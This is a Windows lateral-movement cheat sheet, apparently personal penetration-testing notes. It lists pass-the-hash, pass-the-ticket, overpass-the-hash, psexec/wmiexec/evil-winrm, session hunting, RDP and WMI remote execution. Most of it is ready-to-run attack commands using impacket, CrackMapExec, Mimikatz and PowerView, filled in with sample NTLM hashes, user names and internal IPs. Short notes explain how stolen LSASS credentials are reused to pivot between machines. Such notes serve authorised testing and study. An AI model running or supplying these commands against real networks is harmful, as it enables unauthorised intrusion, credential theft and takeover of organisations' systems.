# Lateral movement

## Pass-the-Hash (PtH)

```bash
impacket-wmiexec <domain>/<user>@<ip> -hashes <LM>:<NT>
# impacket-wmiexec -hashes :4de2bbb92b158793ba49e0becabb0aa0 'rahul.Dhawan'@10.10.10.12

cme smb <ip> -u <user> -H <NTLM_hash>
```

**Why:** Reuse a dumped NTLM hash to authenticate as that user.

* Requires NTLM hash (usually from LSASS/secretsdump)
* Used to pivot to other systems via SMB, WMI, WinRM

***

## Pass-the-Ticket (PtT)

```powershell
kerberos::ptt <ticket.kirbi>
# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

**Why:** Reuse `.kirbi` ticket to impersonate user on other machines.

* Requires extracted Kerberos TGT or TGS from memory
* Works on services supporting Kerberos (e.g., SMB, LDAP)

***

## Overpass-the-Hash (Pass-the-Key)

```powershell
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
# sekurlsa::pth /user:Administrator /domain:test.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:powershell
```

**Why:** Use NTLM hash to request a fresh TGT.

* Requires NTLM hash and domain context
* Enables Kerberos-auth to lateral targets

***

## WMExec / PSExec / WinRM

```bash
impacket-psexec <domain>/<user>@<target> -hashes <LM>:<NT>
# passing the hash using Impacket wmiexec
## impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73


evil-winrm -i <target> -u <user> -H <NTLM>
# evil-winrm -u rahul.dhawan-H 'asdfasfsafsafsafsadfasdfaf' -i ms02.test.com

```

**Why:** Shell access on remote machine using valid creds/hash.

* Requires admin or RDP/WMI access
* Establishes interactive shell to move deeper

***

## Session Hijacking

```powershell
Get-NetSession -ComputerName <host>
# Get-NetSession -ComputerName files04 -verbose

Get-NetLoggedon -ComputerName <host>
Invoke-UserHunter -CheckAccess
```

**Why:** Find where privileged users are logged in to pivot further.

* Requires net session/logon rights (often local admin)
* Lets you target high-priv endpoints for lateral escalation

***

## RDP Pivot

```powershell
# Check if RDP is allowed, then use harvested creds
mstsc /v:<target>
```

**Why:** Direct GUI access to another host.

* Requires RDP enabled & credentials
* Convenient for interacting with GUI-only targets

***

## WMI Event Subscription or Scripting Abuse

```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c <payload>' -ComputerName <host>
```

**Why:** Execute code remotely via WMI.

* Needs valid creds with remote WMI access
* Useful when PsExec/SMB blocked

***
